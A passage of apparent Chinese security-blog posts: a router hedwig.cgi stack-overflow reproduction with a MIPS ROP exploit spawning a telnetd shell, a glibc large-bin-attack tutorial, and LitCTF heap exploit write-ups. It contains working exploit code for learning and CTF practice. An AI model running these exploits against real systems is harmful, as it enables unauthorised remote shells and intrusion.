测试溢出大小\n\n需要用到``pwntools,gdbserver,gdb-multiarch,FirmAE``\n\n在动调前我们需要写好两个脚本\n\n第一个：建立预**POST**脚本\n\n```python\nfrom pwn import *\nimport requests\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n\nurl = \"http://192.168.0.1/hedwig.cgi\"\nheaders = {\n    \"Cookie\"        : b\"uid=\" + payload,\n    \"Content-Type\"  : \"application/x-www-form-urlencoded\", #表单提交的默认编码方式，用于发送键值对形式的数据以URL编码的方式发送，键值对用&连接，键和值用=分隔\n    \"Content-Length\": \"11\",\n    \"REQUEST_METHOD\":\"POST\",\n    \"REQUEST_URI\"   :\"/hedwig.cgi\",\n}\nres = requests.post(url = url, headers = headers)\n```\n\n第二个：gdb-multiarch脚本，可以随意命名\n\n```python\nset architecture mips #设置架构\nset follow-fork-mode child #指定被调的程序执行fork()系统调用时跟进子进程。若为parent，则继续跟踪父进程，忽视子进程\nset detach-on-fork off #设置fork分离模式，off为不自动将未被跟踪的进程（父进程或子进程）从调试会话中分离\nb *0x409A30 #下断点\ntarget remote 192.168.0.1:1337 #链接远端\n```\n\n命名好后启动如下命令即可开始调试\n\n``gdb-multiarch -x filename``\n\n好了，现在我们就可以尝试寻找溢出点了。我们**用pwntools里提供的cyclic函数来定位溢出点**\n\n![image-20241125025624346](https://s2.loli.net/2024/11/25/VathWMnbwuG7Uqr.png)\n\n可以得到``offset``大约为1043(注意，是大约，并不一定完全准确，还需要自己微调)，我们再调一次看看结果如何\n\n`` cyclic(1043) + b'dusk'``\n\n![image-20241125030651047](https://s2.loli.net/2024/11/25/ohJwxHC2fc4TykO.png)\n\n与很好的结果，与测定结果相同，此时我们就已经劫持ra跳转地址了，那么我们还需要一些``gadget``辅助我们进行system函数调用\n\n## gadget思路\n\n需要注意的是，``sprintf``有``\\x00``截断，而system函数恰好以\\x00结尾，这时候就需要用到我们的流水线效应了\n\n![image-20241125031010668](https://s2.loli.net/2024/11/25/gtKcnEZGsoBAVhS.png)\n\n我们可以让**system-1**，然后**找一个跳转指令并且紧跟着add res,1的指令**就可以使我们的system函数恢复，光回复不够，我们还需要调用，所以我们还得找一个gadget来**使存储system函数的某s寄存器被赋值给t9然后通过jalr调用**即可，所幸我们能在libc里找到，相对偏移如下\n\n![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20241125214530-895074dc-ab33-1.png)\n\n![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20241125214616-a47e2d08-ab33-1.png)\n\n```\n0x000159cc : addiu $s5, $sp, 0x10 ; move $a1, $s3 ; move $a2, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s5\n0x000158c8 : move $t9, $s5 ; jalr $t9 ; addiu $s0, $s0, 1\n```\n\n然后就是精心构造payload和需要执行的命令了\n\n## exp\n\n```python\nfrom pwn import *\nimport requests\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x77f34000\nmove_jalr = 0x159CC + libc_base\naddiu_jalr = 0x158C8 + libc_base\nsystem = 0x53200 + libc_base\npayload = cyclic(1007)\npayload += p32(system - 1) #$s0\npayload += b'a'*0x10\npayload += p32(move_jalr) #$s5\npayload += b'b' * 0xc\npayload += p32(addiu_jalr)\npayload += b'c' * 0x10\npayload += b'telnetd -l /bin/sh -p 2345 & ls & ' #起一个telnetd服务，监听端口为2345，并提供交互shell，\n \nurl = \"http://192.168.0.1/hedwig.cgi\"\nheaders = {\n    \"Cookie\"        : b\"uid=\" + payload,\n    \"Content-Type\"  : \"application/x-www-form-urlencoded\",\n    \"Content-Length\": \"11\",\n    \"REQUEST_METHOD\":\"POST\",\n    \"REQUEST_URI\"   :\"/hedwig.cgi\",\n}\nres = requests.post(url = url, headers = headers)\n```\n\n执行效果如下\n\n![image-20241125032345219](https://s2.loli.net/2024/11/25/zZ1YkRuDaHfIJm8.png)\n\n\n\n![image-20241125032452950](https://s2.loli.net/2024/11/25/FV1EmXf3wqtr5WB.png)\n\n完成复现\n","tags":["IOT","Stack"],"categories":["物联网安全"]},{"title":"large_bins_attack","url":"/2024/09/17/large_bin_attack/","content":"\n\n\n# 导言\n\n在libc版本越来越高的情况下，许多旧的攻击方式已然失效，而large_bin_attack始终屹立不倒，是许多攻击方式的先决条件，这也是我们要学习它的原因\n# large_bin\n## 概念\nlarge_bin是一种堆分配的管理方式，是**双向链表**，用于管理大于某个特定大小阈值的内存块。**一般而言，进入large_bin的最低字节为0x200(512)**。但由于引入了tcache_bin，使得**在tcache_bin尚未填满的情况下，进入large_bin的最低字节为0x410(1040)**，所以一般我们设置大堆块都是0x410起步\n## 结构\nlarge_bins中含有**63个bin**，而large_bins**总体又被分成6个组**，每个组对应一个区间，且容纳个数呈指数性减少，示意图如下\n![image.png](https://s2.loli.net/2024/05/29/1fvEBsPNX4Mn7Hw.png)\n\n说完组成部分，我们来看看链表的结构\n\n![image.png](https://s2.loli.net/2024/05/30/udryPOsYVeZwkNn.png)\n\n1.在large_bin中的排列顺序是**从大到小**的顺序，所以越大的chunk越靠前，越小的chunk越靠后，最小的chunk指向main_arena+一定偏移。也就是说，**非尾部的fd_nextsize指向的是更小的chunk，非头部的bk_nextsize指向的是更大的chunk**\n\n2.在相同大小的情况下，按照free的时间进行排序\n\n3.只有首堆块的fd_nextsize,bk_nextsize会指向其它大小的堆块，而其后的堆块中fd_nextsize,bk_nextsize无效，通常为0\n\n说完了large_bin的概念和结构，那么我们现在该写如何实现large_bin_attack了。large_bin_attack也是有分水岭的，这个分水岭就是glibc-2.31，所以本文会分为两个板块，一个讲解2.23版本的large_bin_attack，另一个讲解2.31版本的large_bin_attack。这两种攻击方式我们都利用<a href=\"https://github.com/shellphish/how2heap\" style=\"text-decoration:none; color:blue;\">how2heap</a>项目团队编写的源码来进行讲解\n\n# glibc-2.23版本的攻击方式\n\n## 适用条件\n\n存在**能够修改堆内容**的函数\n\n从unsorted_bins里提取出来的堆块要**紧挨着我们伪造过的large_bins里的堆块**\n\n## how2heap源码及动调\n首先展示源码\n```C\n#include<stdio.h>\n#include<stdlib.h>\n#include<assert.h>\n \nint main()\n{\n    fprintf(stderr, \"This file demonstrates large bin attack by writing a large unsigned long value into stack\\n\");\n    fprintf(stderr, \"In practice, large bin attack is generally prepared for further attacks, such as rewriting the \"\n           \"global variable global_max_fast in libc for further fastbin attack\\n\\n\");\n\n    unsigned long stack_var1 = 0;\n    unsigned long stack_var2 = 0;\n\n    fprintf(stderr, \"Let's first look at the targets we want to rewrite on stack:\\n\");\n    fprintf(stderr, \"stack_var1 (%p): %ld\\n\", &stack_var1, stack_var1);\n    fprintf(stderr, \"stack_var2 (%p): %ld\\n\\n\", &stack_var2, stack_var2);\n\n    unsigned long *p1 = malloc(0x420);\n    fprintf(stderr, \"Now, we allocate the first large chunk on the heap at: %p\\n\", p1 - 2);\n\n    fprintf(stderr, \"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\"\n           \" the first large chunk during the free()\\n\\n\");\n    malloc(0x20);\n\n    unsigned long *p2 = malloc(0x500);\n    fprintf(stderr, \"Then, we allocate the second large chunk on the heap at: %p\\n\", p2 - 2);\n\n    fprintf(stderr, \"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\"\n           \" the second large chunk during the free()\\n\\n\");\n    malloc(0x20);\n\n    unsigned long *p3 = malloc(0x500);\n    fprintf(stderr, \"Finally, we allocate the third large chunk on the heap at: %p\\n\", p3 - 2);\n \n    fprintf(stderr, \"And allocate another fastbin chunk in order to avoid consolidating the top chunk with\"\n           \" the third large chunk during the free()\\n\\n\");\n    malloc(0x20);\n \n    free(p1);\n    free(p2);\n    fprintf(stderr, \"We free the first and second large chunks now and they will be inserted in the unsorted bin:\"\n           \" [ %p <--> %p ]\\n\\n\", (void *)(p2 - 2), (void *)(p2[0]));\n\n    malloc(0x90);\n    fprintf(stderr, \"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the\"\n            \" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation\"\n            \", and reinsert the remaining of the freed first large chunk into the unsorted bin:\"\n            \" [ %p ]\\n\\n\", (void *)((char *)p1 + 0x90));\n\n    free(p3);\n    fprintf(stderr, \"Now, we free the third large chunk and it will be inserted in the unsorted bin:\"\n           \" [ %p <--> %p ]\\n\\n\", (void *)(p3 - 2), (void *)(p3[0]));\n \n    //------------VULNERABILITY-----------\n\n    fprintf(stderr, \"Now emulating a vulnerability that can overwrite the freed second large chunk's \\\"size\\\"\"\n            \" as well as its \\\"bk\\\" and \\\"bk_nextsize\\\" pointers\\n\");\n    fprintf(stderr, \"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk\"\n            \" at the head of the large bin freelist. To overwrite the stack variables, we set \\\"bk\\\" to 16 bytes before stack_var1 and\"\n            \" \\\"bk_nextsize\\\" to 32 bytes before stack_var2\\n\\n\");\n\n    p2[-1] = 0x3f1;\n    p2[0] = 0;\n    p2[2] = 0;\n    p2[1] = (unsigned long)(&stack_var1 - 2);\n    p2[3] = (unsigned long)(&stack_var2 - 4);\n\n    //------------------------------------\n\n    malloc(0x90);\n \n    fprintf(stderr, \"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist.\"\n            \" During this time, targets should have already been rewritten:\\n\");\n\n    fprintf(stderr, \"stack_var1 (%p): %p\\n\", &stack_var1, (void *)stack_var1);\n    fprintf(stderr, \"stack_var2 (%p): %p\\n\", &stack_var2, (void *)stack_var2);\n\n    // sanity check\n    assert(stack_var1 != 0);\n    assert(stack_var2 != 0);\n\n    return 0;\n}\n```\n简单解释一下这段代码的意思。首先设置了stack_var1,2的值并展示了各自的地址，接下来申请了p1,p2,p3三个分别大小为0x420,0x500,0x500的大堆块(中间的0x20堆块起保护作用，防止合并)。free掉p1,p2,此时在unsorted_bins里。申请出一个0x90的堆块后，会把p2放进large_bins里，而p1先被分进small_bins里又被切割了0x90大小的堆块并被放回了unsorted_bins里。free了p3之后伪造p2的size,bk和bk_nextsize。再次申请一个0x90的堆块后，p1又会被分割，而p3会被放进large_bins，且p3的bk被赋值为了stack_var1-0x10的地址，bk_nextsize被赋值为了stack_var2-0x20的地址（至于为什么有减去这两个数，参考chunk的结构），而stack_var1,2的值都是p3的头指针(prev)\n\n啰里八嗦一大堆估计大家也看不懂，所以先动调来看看\n### 申请三个堆\n```C\nunsigned long stack_var1 = 0;\nunsigned long stack_var2 = 0;\nunsigned long *p1 = malloc(0x420);\nmalloc(0x20);\nunsigned long *p2 = malloc(0x500);\nmalloc(0x20);\nunsigned long *p3 = malloc(0x500);\nmalloc(0x20);\n```\n记住此时的var值和堆结构\n\n![image.png](https://s2.loli.net/2024/05/29/Ed493rp5YVeMhSD.png)\n\n![image.png](https://s2.loli.net/2024/05/29/AjRGQYDoH2LiX9k.png)\n\n### 逐步释放三个堆\n```C\nfree(p1);\nfree(p2);\nmalloc(0x90);\nfree(p3);\n```\n首先释放完p1,p2,一切都很正常\n\n![image.png](https://s2.loli.net/2024/05/29/f45VEjdD7y8hukM.png)\n\n到了比较关键的一步，申请个0x90的堆块\n\n![image.png](https://s2.loli.net/2024/05/29/GwOHRX9ClP8ySoi.png)\n\n可以看到，p2被放进了large_bins里，而p1地址增长了0xa0后还待在unsorted_bins里。一个malloc(0x90)干的事其实还真不少\n\n首先它将p1提取出来放进了small_bins里，将p2提取出来放到了large_bins里。为了满足malloc(0x90),系统遍历bins链表，依次从**fast-->unsorted-->small-->large-->top**的顺序扫描。而我们的p1很不幸就再次被提了出来，被切割，**被丢回unsorted_bins等待分配**\n\n然后它的hxd p3就来陪它了\n\n![image.png](https://s2.loli.net/2024/05/29/ikdhqBALv9nMtUm.png)\n\n### 修改p2的结构体\n```C\n    p2[-1] = 0x3f1; //size\n    p2[0] = 0; //fd\n    p2[2] = 0; //fd_nextsize\n    p2[1] = (unsigned long)(&stack_var1 - 2); //bk，指向stack_var1-0x10的位置\n    p2[3] = (unsigned long)(&stack_var2 - 4); //bk_nextsize，指向stack_var2-0x20的位置\n```\n这是整个修改过程中最重要的部分，**修改p2的结构**，为后续的攻击做铺垫\n\n原结构和内容\n\n![image.png](https://s2.loli.net/2024/05/29/6hwVCiQ3KF5vxdk.png)\n\n经过这段代码修改过后的结构和内容\n\n![image.png](https://s2.loli.net/2024/05/29/pBQzOAwg6Uuj23k.png)\n\n可以看到我们已经成功完成了修改，此时p2的结构如下图所示\n\n![image.png](https://s2.loli.net/2024/05/29/JNsZQX6avEobhkL.png)\n\n### 修改stack_var值\n```C\nmalloc(0x90);\nfprintf(stderr, \"stack_var1 (%p): %p\\n\", &stack_var1, (void *)stack_var1);\nfprintf(stderr, \"stack_var2 (%p): %p\\n\", &stack_var2, (void *)stack_var2);\n```\n短短三行代码其实包含了很多东西。\n\n依旧是这个malloc(0x90),p1依旧惨遭剥削，p3被扔进large_bins里。此时会对p2和p3的大小做出比较，先看看比较过程\n```C\nwhile((unsigned long)size < fwd->size){\n    fwd = fwd->fd_nextsize;\n    assert ((fwd->size & NON_MAIN_ARENA) == 0);\n} //这里检测的是从unsorted_bins里提取出的堆块是否小于large_bins里最近被释放的堆块的大小，如果小于，就将fwd向前移，也就是与比它更小的堆块对比\nif ((unsigned long) size == (unsigned long) fwd->size)\n/* Always insert in the second position.  */\nfwd = fwd->fd;//相等的话，就往后排列\nelse\n{\n    victim->fd_nextsize = fwd; //这里,victim是从unsorted_bin提取出来的堆块，fwd是最近被释放进large_bin的堆块，分别对应我们的p3,p2\n    victim->bk_nextsize = fwd->bk_nextsize; //在此前,p2->bk_nextsize已经被我们设置为了stack_var2-0x20的地址，所以p3的bk_nextsize指向它\n    fwd->bk_nextsize = victim; //p2->bk_nextsize指向p3\n    victim->bk_nextsize->fd_nextsize = victim; //p3->bk_nextsize = stack_var2 - 0x20，也就是说我们已经伪造了一个堆块，(stack_var2-0x20)->fd_nexitsize就是stack_var2的地址，将该地址赋值p3的头指针\n}\nbck = fwd->bk; //p2的bk我们设置成了stack_var1-0x10，所以bck成了我们stack_var1-0x10这个虚假的chunk\n```\n很显然，我们p2的0x3F0小于p3的0x510，所以会执行else里的语句，跟我注释里写的一样，为了起到明显的对比效果，我分别把修改前和修改后的截图放出来\n\n修改前的p2和p3\n\n![ 2024-05-29 214003.png](https://s2.loli.net/2024/05/29/FNeOPAimTnYzD8I.png)\n\n修改后的p2和p3\n\n![image.png](https://s2.loli.net/2024/05/29/vCMRa24h8N9PXV7.png)\n\n可以看到，我们已经把p3的bk和bk_nextsize修改成了stack_var1-0x10和stack_var2-0x20，而这两个分别对应的fd,fd_nextsize指针指向的就是我们的stack_var1,stack_var2，我们就把chunk3的头指针给输入进这两个地址内部了\n\n![image.png](https://s2.loli.net/2024/05/29/Z9uK1FhzQ6Lnm24.png)\n\n## 总结\n\n这个攻击主要就是利用两个chunk，大的为p3,小的为p2。我们可以**伪造较小堆块p2的bk和bk_nextsize**，分别指向**target1-0x10,target2_0x20**，放进large_bins里(可以的话，large_bins在此前最好是空的)。而大堆块p3在经过malloc后放进large_bins里，将**p3的头指针赋值给了target1,target2**，完成了**任意地址写**。将p3的头指针写进target1,2里后，可以**结合其它House of 系列进行攻击**\n\n# glibc-2.31版本的攻击方式\n## 新增检测\n```C\nelse\n{\n       victim->fd_nextsize = fwd;\n       victim->bk_nextsize = fwd->bk_nextsize;\n       if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) //以上面的p2为例的话，那就是检测stack_var2-0x20的fd_nextsize是否指向p2。是的话就报错\n              malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n       fwd->bk_nextsize = victim;\n       victim->bk_nextsize->fd_nextsize = victim;\n}\nbck = fwd->bk;\nif (bck->fd != fwd)// 同理，如果stack_var1-0x10的fd是否指向p2，是就报错\n       malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n```\n因为这个检测，我们在glibc-2.23的攻击方式算是彻底失效了，得另寻他路\n\n## 新源码利用\n```C\nassert (chunk_main_arena (bck->bk));//断言bck->bk属于main_arena\nif ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))\n{\n       fwd = bck; //这里的fwd可以粗略的认为是large_bin归属的main_arena\n       bck = bck->bk; //bck成了main_arena的bk指针指向的堆块\n       victim->fd_nextsize = fwd->fd; //我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块\n       victim->bk_nextsize = fwd->fd->bk_nextsize;//攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize\n       fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; //先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd->fd->bk_nextsize = victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim\n}\n```\n这段代码与unsorted_bins、large_bins有关，这是**从unsorted_bins里提取出来的堆块((unsigned long) (size))与large_bins里的最小堆块((unsigned long) chunksize_nomask (bck->bk))进行比较**,如果unsorted出来的堆块更小，就执行如上操作。\n\n**注意，这里并没有进行检测操作！**，意味着我们**可以对bk_nextsize进行修改**，再次**实现任意地址写**\n\n## how2heap新源码及动调\n```C\n#include<stdio.h>\n#include<stdlib.h>\n#include<assert.h>\nint main(){\n  /*Disable IO buffering to prevent stream from interfering with heap*/\n  setvbuf(stdin,NULL,_IONBF,0);\n  setvbuf(stdout,NULL,_IONBF,0);\n  setvbuf(stderr,NULL,_IONBF,0);\n\n  printf(\"\\n\\n\");\n  printf(\"Since glibc2.30, two new checks have been enforced on large bin chunk insertion\\n\\n\");\n  printf(\"Check 1 : \\n\");\n  printf(\">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\\n\");\n  printf(\">        malloc_printerr (\\\"malloc(): largebin double linked list corrupted (nextsize)\\\");\\n\");\n  printf(\"Check 2 : \\n\");\n  printf(\">    if (bck->fd != fwd)\\n\");\n  printf(\">        malloc_printerr (\\\"malloc(): largebin double linked list corrupted (bk)\\\");\\n\\n\");\n  printf(\"This prevents the traditional large bin attack\\n\");\n  printf(\"However, there is still one possible path to trigger large bin attack. The PoC is shown below : \\n\\n\");\n  \n  printf(\"====================================================================\\n\\n\");\n\n  size_t target = 0;\n  printf(\"Here is the target we want to overwrite (%p) : %lu\\n\\n\",&target,target);\n  size_t *p1 = malloc(0x428);\n  printf(\"First, we allocate a large chunk [p1] (%p)\\n\",p1-2);\n  size_t *g1 = malloc(0x18);\n  printf(\"And another chunk to prevent consolidate\\n\");\n\n  printf(\"\\n\");\n\n  size_t *p2 = malloc(0x418);\n  printf(\"We also allocate a second large chunk [p2]  (%p).\\n\",p2-2);\n  printf(\"This chunk should be smaller than [p1] and belong to the same large bin.\\n\");\n  size_t *g2 = malloc(0x18);\n  printf(\"Once again, allocate a guard chunk to prevent consolidate\\n\");\n\n  printf(\"\\n\");\n\n  free(p1);\n  printf(\"Free the larger of the two --> [p1] (%p)\\n\",p1-2);\n  size_t *g3 = malloc(0x438);\n  printf(\"Allocate a chunk larger than [p1] to insert [p1] into large bin\\n\");\n\n  printf(\"\\n\");\n\n  free(p2);\n  printf(\"Free the smaller of the two --> [p2] (%p)\\n\",p2-2);\n  printf(\"At this point, we have one chunk in large bin [p1] (%p),\\n\",p1-2);\n  printf(\"               and one chunk in unsorted bin [p2] (%p)\\n\",p2-2);\n\n  printf(\"\\n\");\n\n  p1[3] = (size_t)((&target)-4);\n  printf(\"Now modify the p1->bk_nextsize to [target-0x20] (%p)\\n\",(&target)-4);\n\n  printf(\"\\n\");\n\n  size_t *g4 = malloc(0x438);\n  printf(\"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\\n\", p2-2, p2-2);\n  printf(\"Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\\n\");\n  printf(\"  the modified p1->bk_nextsize does not trigger any error\\n\");\n  printf(\"Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd_nextsize is overwritten to address of [p2] (%p)\\n\", p2-2, p1-2, p2-2);\n\n  printf(\"\\n\");\n\n  printf(\"In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\\n\", p2-2, (void *)target);\n  printf(\"Target (%p) : %p\\n\",&target,(size_t*)target);\n\n  printf(\"\\n\");\n  printf(\"====================================================================\\n\\n\");\n\n  assert((size_t)(p2-2) == target);\n\n  return 0;\n}\n```\n跟之前相比起来其实大差不差，但是中间申请的堆块从小堆块变成了大堆块(指从0x90变成了0x438)，跟前面雷同的地方我就不再演示，主要看`free(p2)`及其之后的动调\n\n### free(p2)及其后的变化\n在刚刚完成free(p2)的时候，堆内的结构是这样的\n\n![ 2024-05-30 155126.png](https://s2.loli.net/2024/05/30/wLGUaxXRqhMCoOP.png)\n\n此时还很正常，那么我们接下来修改p1的bk_nextsize\n\n![ 2024-05-30 155548.png](https://s2.loli.net/2024/06/05/lsvUaD398MOcyrf.png)\n\n可以看到，我们把p1的bk_nextsize修改成了target-0x20字节处的地址，我们继续往下走\n\n申请完最后一个大堆块，这是此时p2和target的变化\n\n![image.png](https://s2.loli.net/2024/05/30/CwxAaNnGvsTzhmy.png)\n![ 2024-05-30 160119.png](https://s2.loli.net/2024/05/30/KYXDNVhj38Spkrf.png)\n\n此时，我们已经完成了我们的目的，任意地址写，已经成功将p2的头指针写进了target里边，实现了large_bin_attack\n\n## 总结\n相较于旧版本的large_bin_attack，高版本的这种攻击只能实现一个地址的任意地址写，结合其他攻击方式的过程会更为繁琐。\n\n这种large_bin_attack，是申请大于p1,p2这两个堆块的堆块，来把p1,p2塞进large_bins里，没有之前的切割行为，我们只用伪造p1这个相对较大的堆块的bk_nextsize即可\n\n## 例题 LitCTF2024 Heap2.39\n### 源代码及分析\n\n![ 2024-09-07 162617.png](https://s2.loli.net/2024/09/07/RAXrhF49Lfi2IV6.png)\n\n![ 2024-09-07 162636.png](https://s2.loli.net/2024/09/07/seXDbncofmZSaMl.png)\n\n![ 2024-09-07 162743.png](https://s2.loli.net/2024/09/07/tsJXSHRnN5dlmEc.png)\n\n![ 2024-09-07 162754.png](https://s2.loli.net/2024/09/07/IKw1d8rbqRoQW3v.png)\n\n![ 2024-09-07 162806.png](https://s2.loli.net/2024/09/07/WZqn1QPkx4fGHV8.png)\n\n![ 2024-09-07 162814.png](https://s2.loli.net/2024/09/07/rpyIBXDakJ5oFLh.png)\n\n根据题目信息可知，这是非常高版本的堆，要用比较新型的攻击方式，而在create里限制了size的大小，典型的large_bins，还看到能主动触发exit，我们可以考虑House of Apple\n\n### 动调过程\n\n先创建5个堆\n```Python\nadd(8,0x508) \nadd(0,0x510)  #p2\nadd(1,0x500) \nadd(2,0x520)  #p1\nadd(3,0x500)\n```\n\n因为有UAF，所以可以据此泄露libc_base和heap_base\n```Python\ndelete(2)\nadd(4,0x550) #分配2进large_bins\nshow(2)\np.recvuntil('content : ')\nlarge_bin = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('large_bin==>'+hex(large_bin))\nlibc_base = large_bin - 0x203F50\nlog.success('libc_base==>'+hex(libc_base))\nIO_list_all = libc_base + libc.symbols['_IO_list_all']\nlog.success('IO_list_all==>'+hex(IO_list_all))\nIO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']\nlog.success('IO_wfile_jumps==>'+hex(IO_wfile_jumps))\nsystem = libc_base + libc.symbols['system']\nlog.success('system==>'+hex(system))\n\nedit(2,b'a'*0x10)\nshow(2)\np.recvuntil('content : ')\np.recvuntil('aaaaaaaaaaaaaaaa')\nheap_addr = u64(p.recv(6).ljust(8,b'\\x00'))\nlog.success('heap_addr==>'+hex(heap_addr))\nheap_base = heap_addr - 0x11d0\nlog.success('heap_base==>'+hex(heap_base))\n```\n\n![ 2024-09-07 191555.png](https://s2.loli.net/2024/09/07/mbE5nGKOxZhS1NL.png)\n\n![ 2024-09-07 191608.png](https://s2.loli.net/2024/09/07/cGxsB26DNmiEkIj.png)\n\nok，泄露完这些基础条件后，就该利用large_bins_attack了，布置好堆\n\n```Python\ndelete(0)\nedit(2,p64(large_bin) + p64(large_bin) + p64(heap_addr) + p64(IO_list_all - 0x20))\nadd(5,0x550)\n```\n这是p1和p2的原始内容,p2尚未分配进large_bins\n\n![ 2024-09-07 192304.png](https://s2.loli.net/2024/09/07/wnjQxvtWCsAb8OX.png)\n\n此时经过edit修改后，p2再分配进large_bins，注意观察p1和p2的内容\n\n![ 2024-09-07 192624.png](https://s2.loli.net/2024/09/07/fr1LRkiaZxyPVbS.png)\n\n![ 2024-09-07 192916.png](https://s2.loli.net/2024/09/07/cvAiBKH5JtrGsCw.png)\n\n可以很明显的看到，原本在`p1的bk_nextsize处的_IO_list_all-0x20转移到了p2的bk_nextsize`，此时，`我们已经向_IO_list_all写入了p2的地址`，接下来就是要利用p2来getshell\n\n![ 2024-09-07 193206.png](https://s2.loli.net/2024/09/07/Vsbm1d4e5M9XEIS.png)\n\n使用过IO攻击的师傅都知道，要伪造IO，本题也不例外，我们使用的是`House of Apple2的_IO_wfile_overflow函数控制执行流`\n\n```Python\nedit(8, b'a' * 0x500 + p32(0xfffff7f5) + b';sh\\x00') \nfake_IO = p64(0) * 2 + p64(1) + p64(2) #当write_ptr>write_base时，会调用overflow\nfake_IO = fake_IO.ljust(0xa0 - 0x10,b'\\x00') + p64(chunk + 0x100) #wide_data\nfake_IO = fake_IO.ljust(0xc0 - 0x10,b'\\x00') + p64(0xffffffffffffffff) #mode\nfake_IO = fake_IO.ljust(0xd8 - 0x10,b'\\x00') + p64(IO_wfile_jumps) #vtable\nfake_IO = fake_IO.ljust(0x100 - 0x10 + 0xe0,b'\\x00') + p64(chunk + 0x200) #_wide_data->_wide_vtable，当write_ptr>write_base且_IO_buf_base为空，会调用_IO_wdoallocbuf\nfake_IO = fake_IO.ljust(0x200 - 0x10,b'\\x00') + p64(0) * 13 + p64(system) # _wide_data->_wide_vtable->doallocate\n\nedit(0,fake_IO)\n```\n\n这段代码最容易迷糊的就是开头的flag位设置，首先我们通过chunk8来修改p2的prevsize位，`0xfffff7f5`的0xffff设置为`屏蔽高四字节`，意味着我们的`sh不会被检测`，`f7f5`则设置了很多状态位，不一一赘述\n\n设置好堆状态，让我们看看此时的堆排列\n\n![ 2024-09-07 194035.png](https://s2.loli.net/2024/09/07/peTwJYr6stAXHju.png)\n\n可以看到此时是已经设置好了的，只要我们主动触发exit即可\n\n![ 2024-09-07 194558.png](https://s2.loli.net/2024/09/07/lIFwNoqUY3ASEd4.png)\n","tags":["Pwn","Heap"],"categories":["网络安全"]},{"title":"LitCTF2024 Pwn方向wp","url":"/2024/06/07/LitCTF_wp/","content":"\n\n\n# 导言\n\n都听别人说这次探姬杯很简单，算新生杯...但这个pwn看起来没那么新生的样子，五堆一栈，栈那道题出的时候我没看，在磕2.35...打完比赛后才发现确实简单，纯纯简单栈溢出，打完后狠狠复现，算是给自己巩固堆了。不过2.39还真是第一次碰，高级货\n\n# Heap\n## 2.23\n### checksec\n\n![image.png](https://s2.loli.net/2024/06/02/pqb26uQY5PCaz9c.png)\n\n## 源审\n\n因为这些堆题的源码都是一样的，所以我就展示一遍\n\n![image.png](https://s2.loli.net/2024/06/02/t9nQfUmwdo5FOsK.png)\n\n![image.png](https://s2.loli.net/2024/06/02/k7M3LJvhmFGgnDW.png)\n\n![image.png](https://s2.loli.net/2024/06/02/dpAxeuvIrtQhjDo.png)\n\n![image.png](https://s2.loli.net/2024/06/02/7xOuZHLwgEbDl64.png)\n\n![ 2024-06-02 211723.png](https://s2.loli.net/2024/06/02/1bglYopkNMwVBnI.png)\n\n![image.png](https://s2.loli.net/2024/06/02/tbDOdk8Q7z6FqyM.png)\n\n### 思路\n\n很正常的UAF漏洞，因为是2.23版本，所以我们能利用的就是fast_bins。因为在该版本下，**伪造fast_bins区间的chunk时，会检测该chunk的size域是否位于fast_bins的区间内**，所以我们要找个fake_fast_chunk，pwndbg里安置了该插件，供我们快速寻找。因为我们**劫持的是malloc_hook**，所以我们寻找它的fake_fast_chunk即可,一般来说，`fake_fast_chunk = malloc_hook - 0x23`\n\n因为我已经在脚本里修改过这个fake_chunk了，所以bk和fd才会全是61。总之，这个地方才是我们攻击的地方。利用错位构造即可写出payload\n![image.png](https://s2.loli.net/2024/06/02/q4Iu8jHibtLNPAf.png)\n\n![image.png](https://s2.loli.net/2024/06/02/WnL83deFQCNb7Uj.png)\n\n将malloc_hook劫持为onegadget即可getshell，因为远端环境无了，所以我打的本地\n\n![image.png](https://s2.loli.net/2024/06/02/Iwvm8AgWacjZtX5.png)\n\n### Payload\n```Python\nfrom pwn import *\ncontext(arch = 'amd64',os = 'linux', log_level = 'debug')\ncontext.terminal = ['tmux','splitw','-h']\n\np = process('./heap')\n# p = remote('node1.anna.nssctf.cn',28945)\nlibc = ELF('./libc.so.6')\n\ndef add(idx,size):\n    p.recvuntil('>>')\n    p.sendline(b'1')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('size? ')\n    p.sendline(str(size))\n\ndef delete(idx):\n    p.recvuntil('>>')\n    p.sendline(b'2')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef show(idx):\n    p.recvuntil('>>')\n    p.sendline(b'3')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n\ndef edit(idx,content):\n    p.recvuntil('>>')\n    p.sendline(b'4')\n    p.recvuntil(b'idx? ')\n    p.sendline(str(idx))\n    p.recvuntil('content : ')\n    p.send(content)\n\nadd(0,0x200)\nadd(1,0x60)\nadd(2,0x60)\nadd(3,0x60)\nadd(4,0x20)\ndelete(0)\nshow(0)\np.recvuntil('content : ')\nmalloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 